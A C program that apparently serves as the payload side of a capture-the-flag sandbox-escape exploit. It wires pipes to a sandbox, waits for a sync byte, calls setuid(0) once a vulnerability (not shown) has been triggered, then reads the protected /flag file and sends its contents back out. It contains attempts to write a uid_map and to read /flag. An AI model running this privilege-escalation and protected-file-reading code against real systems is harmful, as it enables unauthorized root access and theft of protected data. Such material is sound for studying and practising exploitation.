#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <string.h>

#define OUR_STDIN (100)
#define OUR_STDOUT (101)

int main() {
    int pipe1[2] = {0};  // pipe1: [0] we read, [1] they write
    int pipe2[2] = {0};  // pipe2: [0] they read, [1] we write
    char flag[256] = {0};
    int flagfile = -1;
    char c = '\x00';
    
    // Sanity check
    system("echo '0 0 1' > /proc/self/uid_map"); // We receive -EPERM on this!
    system("cat /flag"); // Permission denied here too

    // Set up pipes
    if (pipe(pipe1) == -1) {
        perror("pipe1");
        exit(1);
    }

    if (pipe(pipe2) == -1) {
        perror("pipe2");
        exit(1);
    }   

    // Set up fds for the sandbox
    dup2(pipe1[1], 0);
    dup2(pipe2[0], 1);
    
    // Set up fds for our usage
    dup2(pipe1[0], OUR_STDIN);
    dup2(pipe2[1], OUR_STDOUT);

    read(OUR_STDIN, &c, 1); // Sync byte from the client
    if (c == 'X')
    {
        system("cat /tmp/verify_sync");
    }

    // We should be able to setuid to root now after triggering the vuln
    setuid(0);
    seteuid(0);

    // Read the flag
    flagfile = open("/flag", O_RDONLY);
    read(flagfile, flag, sizeof(flag));

    // Write the flag to the sandboxer and receive it 
    write(OUR_STDOUT, flag, strlen(flag));

    sleep(100);
    return 0;
}